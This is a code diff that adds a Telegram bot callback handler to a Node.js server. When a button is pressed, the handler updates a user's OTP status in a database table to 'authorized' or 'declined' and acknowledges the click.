@@ -167,6 +167,26 @@ bot.on("callback_query", async (query) => {
   await bot.sendMessage(query.message.chat.id, `Action: ${query.data}`);
 });
 
+// Handle Telegram button clicks (callback queries)
+bot.on("callback_query", async (query) => {
+  try {
+    const [action, id] = query.data.split("_"); // e.g., authorized_123
+
+    if (action === "authorized" || action === "declined") {
+      // Update the user_data table
+      db.prepare("UPDATE user_data SET otp_status = ? WHERE id = ?")
+        .run(action === "authorized" ? "authorized" : "declined", id);
+
+      console.log(`📝 Updated OTP status for user ${id}: ${action}`);
+
+      // Notify Telegram that button was received
+      await bot.answerCallbackQuery(query.id, { text: `✅ Received: ${query.data}` });
+    }
+  } catch (err) {
+    console.error("💥 Error handling callback query:", err);
+  }
+});
+
 // ─────────────────────────────
 // API Routes
 // ─────────────────────────────
@@ -328,6 +348,7 @@ app.get("/api/test-telegram", async (req, res) => {
 // ─────────────────────────────
 // Start Server
 // ─────────────────────────────
+
 
 
 
